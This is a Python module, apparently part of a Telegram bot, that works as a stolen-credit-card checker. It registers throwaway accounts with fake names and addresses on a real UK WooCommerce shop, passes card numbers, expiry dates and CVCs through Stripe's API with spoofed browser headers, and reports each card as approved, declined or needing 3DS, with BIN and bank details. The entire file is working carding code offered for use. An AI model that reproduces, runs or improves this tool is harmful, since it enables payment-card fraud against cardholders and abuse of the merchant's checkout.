# functions/stripe_checkout.py
"""
Stripe checkout integration
"""

import requests
import re
import time
import random
from faker import Faker
from typing import Optional, Tuple, Dict, Any, List
import asyncio

fake = Faker()
BASE = "https://www.propski.co.uk/"

def create_session():
    """Create a requests session with proper headers"""
    s = requests.Session()
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    })
    return s

def get_nonce(url: str, pattern: str, session, headers=None):
    """Extract nonce from page"""
    headers = headers or {}
    r = session.get(url, headers=headers)
    if r.status_code != 200:
        return None
    m = re.search(pattern, r.text)
    return m.group(1) if m else None

def register_account(session, email: str) -> Tuple[bool, str]:
    """Register a new account"""
    register_nonce = get_nonce(
        f"{BASE}/my-account/",
        r'name="woocommerce-register-nonce" value="(.*?)"',
        session,
        headers={'referer': f'{BASE}/my-account/'}
    )
    if not register_nonce:
        return False, "Could not obtain register nonce."

    params = {'action': 'register'}
    data = {
        'email': email,
        'wc_order_attribution_session_entry': f'{BASE}/my-account/',
        'wc_order_attribution_user_agent': session.headers.get('User-Agent'),
        'woocommerce-register-nonce': register_nonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }
    r = session.post(f"{BASE}/my-account/", params=params, data=data, headers={'referer': f'{BASE}/my-account/'})
    return r.status_code in (200, 302), f"Register status: {r.status_code}"

def post_billing_address(session, email: str) -> Tuple[bool, str]:
    """Post billing address for account"""
    url = f"{BASE}/my-account/edit-address/billing/"
    r = session.get(url, headers={'referer': f'{BASE}/my-account/edit-address/'})
    if r.status_code != 200:
        return False, f"GET edit-address returned {r.status_code}"
    
    m = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', r.text)
    address_nonce = m.group(1) if m else None
    if not address_nonce:
        return False, "Could not obtain address nonce."

    data = {
        'billing_first_name': 'Mama',
        'billing_last_name': 'Babbaw',
        'billing_company': '',
        'billing_country': 'AU',
        'billing_address_1': 'Street allen 45',
        'billing_address_2': '',
        'billing_city': 'New York',
        'billing_state': 'NSW',
        'billing_postcode': '10080',
        'billing_phone': '15525546325',
        'billing_email': email,
        'save_address': 'Save address',
        'woocommerce-edit-address-nonce': address_nonce,
        '_wp_http_referer': '/my-account/edit-address/billing/',
        'action': 'edit_address',
    }
    r2 = session.post(url, headers={'origin': BASE, 'referer': url}, data=data)
    return r2.status_code in (200, 302), f"Post address status: {r2.status_code}"

def get_add_payment_page_and_nonces(session):
    """Get payment page and extract nonces"""
    url = f"{BASE}/my-account/add-payment-method/"
    r = session.get(url, headers={'referer': f'{BASE}/my-account/payment-methods/'})
    if r.status_code != 200:
        return None
    create_setup_nonce_m = re.search(r'"add_card_nonce"\s*:\s*"([^"]+)"', r.text)
    return create_setup_nonce_m.group(1) if create_setup_nonce_m else None

def check_bin(bin_number: str, session) -> Optional[Dict]:
    """Check BIN information"""
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    try:
        resp = session.get(url, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            return {
                "level": data.get("level", "Unknown"),
                "brand": data.get("brand", "Unknown"),
                "type": data.get("type", "Unknown"),
                "bank": data.get("bank", "Unknown"),
                "country": data.get("country_name", "Unknown"),
                "flag": data.get("country_flag", "🏳️"),
                "bin": bin_number
            }
    except Exception:
        pass
    return None

def create_stripe_payment_method(card_number: str, exp_month: str, exp_year: str, cvc: str, email: str, pk_key: str):
    """Create Stripe payment method"""
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'pragma': 'no-cache',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        "referrer": BASE,
        "type": "card",
        "owner[email]": email,
        "card[number]": card_number,
        "card[cvc]": cvc,
        "card[exp_month]": exp_month,
        "card[exp_year]": exp_year,
        "guid": "5f072a89-96d0-4d98-9c15-e2120acb9f6385f761",
        "muid": "2e70679e-a504-4e9c-ad79-a9bcf27bc72a6b90d5",
        "sid": "18d15059-63f6-4de6-b243-999e709ea0725ea079",
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js/8702d4c73a; stripe-js-v3/8702d4c73a; split-card-element",
        "time_on_page": "36611",
        "client_attribution_metadata[client_session_id]": "a36626e3-53c5-4045-9c7c-d9a4bb30ffd7",
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "cardNumber",
        "client_attribution_metadata[merchant_integration_version]": "2017",
        "key": pk_key
    }

    return requests.post('https://api.stripe.com/v1/sources', headers=headers, data=data, timeout=30)

def attach_payment_method_to_site(session, pmid: str, ajax_nonce: str):
    """Attach payment method to site"""
    params = {
        'wc-ajax': 'wc_stripe_create_setup_intent',
    }
    
    data = {
        'stripe_source_id': pmid,
        'nonce': ajax_nonce,
    }
    
    headers = {
        'authority': 'www.propski.co.uk',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': BASE,
        'referer': f'{BASE}/my-account/add-payment-method/',
    }
    return session.post('https://www.propski.co.uk/', params=params, headers=headers, data=data)

def parse_card_line(line: str) -> Optional[Tuple[str, str, str, str]]:
    """Parse card from different formats: | or / separators, with 2 or 4 digit year"""
    line = line.strip()
    if not line:
        return None
    
    # Remove any extra spaces
    line = re.sub(r'\s+', '', line)
    
    # Try | separator first
    if '|' in line:
        parts = line.split('|')
        if len(parts) == 4:
            num, mon, year, cvc = parts
            return parse_card_components(num, mon, year, cvc)
    
    # Try / separator
    elif '/' in line:
        parts = line.split('/')
        if len(parts) == 4:
            num, mon, year, cvc = parts
            return parse_card_components(num, mon, year, cvc)
    
    return None

def parse_card_components(num: str, mon: str, year: str, cvc: str) -> Optional[Tuple[str, str, str, str]]:
    """Parse and format card components"""
    num = num.replace(' ', '').strip()
    mon = mon.strip().zfill(2)
    year = year.strip()
    cvc = cvc.strip()
    
    # Validate basic format
    if not num.isdigit() or not mon.isdigit() or not cvc.isdigit():
        return None
    
    # Handle year format (2 or 4 digits)
    if len(year) == 4 and year.startswith('20'):
        year2 = year[2:]
    else:
        year2 = year[-2:] if len(year) >= 2 and year[-2:].isdigit() else year
    
    return (num, mon, year2, cvc)

def format_card_display(card_data: Tuple[str, str, str, str]) -> str:
    """Format card for display"""
    num, mon, year2, cvc = card_data
    return f"{num}|{mon}|20{year2}|{cvc}"

def format_result_message(card: str, status: str, response: str, elapsed: float = None, bin_info: dict = None) -> str:
    """Format result message with consistent styling"""
    parts = card.split('|')
    if len(parts) == 4:
        num, mon, year, cvc = parts
    else:
        num, mon, year2, cvc = card.split('|') if '|' in card else card.split('/')
        year = f"20{year2}" if len(year2) == 2 else year2
    
    # Status emoji and styling
    if status == "APPROVED":
        status_emoji = "✅"
        status_text = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙"
    elif status == "DECLINED":
        status_emoji = "❌"
        status_text = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙"
    elif status == "OTP":
        status_emoji = "⚠️"
        status_text = "3𝘿𝙎 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙"
    else:
        status_emoji = "❓"
        status_text = "𝙐𝙣𝙠𝙣𝙤𝙬𝙣"
    
    # Build message
    message = f"<b>{status_emoji} {status_text} {status_emoji}</b>\n\n"
    message += f"<b>💳 𝐂𝐚𝐫𝐝 ➙</b> <code>{num}|{mon}|{year}|{cvc}</code>\n"
    message += f"<b>🌐 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➙</b> Stripe Auth\n"
    message += f"<b>📡 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➙</b> <code>{response}</code>\n\n"
    
    # Add BIN info if available
    if bin_info:
        message += f"<b>🔍 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ➙</b> {bin_info['type']} - {bin_info['brand']} - {bin_info['level']}\n"
        message += f"<b>🏦 𝐁𝐚𝐧𝐤 ➙</b> {bin_info['bank']}\n"
        message += f"<b>🌍 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➙</b> {bin_info['country']} {bin_info['flag']}\n\n"
    else:
        message += f"<b>🔍 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ➙</b> N/A\n"
        message += f"<b>🏦 𝐁𝐚𝐧𝐤 ➙</b> N/A\n"
        message += f"<b>🌍 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➙</b> N/A 🏳️\n\n"
    
    # Add time if available
    if elapsed:
        message += f"<b>⏱️ 𝗧𝗼𝗼𝗸 ➙</b> <code>{elapsed}s</code>"
    
    return message

async def process_single_card(card_data: Tuple[str, str, str, str], silent_declined: bool = False) -> Tuple[str, str, Dict]:
    """
    Process a single card and return result
    
    Args:
        card_data: Tuple of (num, mon, year2, cvc)
        silent_declined: If True, don't send messages for declined cards
    
    Returns:
        Tuple of (status, result_message, card_data_with_bin)
    """
    num, mon, year2, cvc = card_data
    card_display = format_card_display(card_data)
    
    # Get BIN info first
    bin_info = None
    num_clean = num.replace(" ", "")
    if len(num_clean) >= 6:
        s_temp = create_session()
        bin_info = check_bin(num_clean[:6], s_temp)
    
    # Create new session
    s = create_session()
    email = f"{fake.first_name()}{fake.last_name()}{random.randint(10,99)}@gmail.com"
    
    # Register account
    created, reg_msg = register_account(s, email)
    if not created:
        result_msg = format_result_message(card_display, "DECLINED", "Account creation failed", None, bin_info)
        return "DECLINED", result_msg, {"card": card_display, "bin_info": bin_info}
    
    # Post billing address
    addr_ok, addr_msg = post_billing_address(s, email)
    if not addr_ok:
        result_msg = format_result_message(card_display, "DECLINED", "Address setup failed", None, bin_info)
        return "DECLINED", result_msg, {"card": card_display, "bin_info": bin_info}
    
    # Get nonce
    create_nonce = get_add_payment_page_and_nonces(s)
    if not create_nonce:
        result_msg = format_result_message(card_display, "DECLINED", "Failed to get nonce", None, bin_info)
        return "DECLINED", result_msg, {"card": card_display, "bin_info": bin_info}
    
    from config import STRIPE_PK_KEY
    pk_key = STRIPE_PK_KEY
    start_time = time.time()
    
    # Create Stripe payment method
    resp = create_stripe_payment_method(num, mon, f"20{year2}", cvc, email, pk_key)
    
    try:
        j = resp.json()
    except Exception:
        j = None
    
    if not j or 'id' not in j:
        error_msg = str(j) if j else "Payment method creation failed"
        result_msg = format_result_message(card_display, "DECLINED", error_msg, None, bin_info)
        return "DECLINED", result_msg, {"card": card_display, "bin_info": bin_info}
    
    pmid = j.get('id')
    attach_resp = attach_payment_method_to_site(s, pmid, create_nonce)
    status_code = getattr(attach_resp, "status_code", None)
    
    elapsed = round(time.time() - start_time, 2)
    
    # Process result
    if status_code == 200:
        try:
            payload = attach_resp.json()
            status = payload.get("status")
            
            if status == "error":
                err = payload.get("error", {})
                detail_msg = err.get("message", "Unknown error")
                result_msg = format_result_message(card_display, "DECLINED", detail_msg, elapsed, bin_info)
                return "DECLINED", result_msg, {"card": card_display, "bin_info": bin_info}
                
            elif status == "requires_action":
                result_msg = format_result_message(card_display, "OTP", "3DS Authentication Required", elapsed, bin_info)
                return "OTP", result_msg, {"card": card_display, "bin_info": bin_info}
                
            elif status == "success":
                result_msg = format_result_message(card_display, "APPROVED", status, elapsed, bin_info)
                return "APPROVED", result_msg, {"card": card_display, "bin_info": bin_info}
            else:
                result_msg = format_result_message(card_display, "DECLINED", f"Unknown status: {status}", elapsed, bin_info)
                return "DECLINED", result_msg, {"card": card_display, "bin_info": bin_info}
        except Exception:
            result_msg = format_result_message(card_display, "DECLINED", "Parse error", elapsed, bin_info)
            return "DECLINED", result_msg, {"card": card_display, "bin_info": bin_info}
    elif status_code == 400:
        try:
            payload = attach_resp.json()
            error_msg = payload.get("data", {}).get("error", {}).get("message", "Card Declined")
            result_msg = format_result_message(card_display, "DECLINED", error_msg, elapsed, bin_info)
            return "DECLINED", result_msg, {"card": card_display, "bin_info": bin_info}
        except:
            result_msg = format_result_message(card_display, "DECLINED", "Card Declined (400)", elapsed, bin_info)
            return "DECLINED", result_msg, {"card": card_display, "bin_info": bin_info}
    else:
        result_msg = format_result_message(card_display, "DECLINED", f"HTTP {status_code}", elapsed, bin_info)
        return "DECLINED", result_msg, {"card": card_display, "bin_info": bin_info}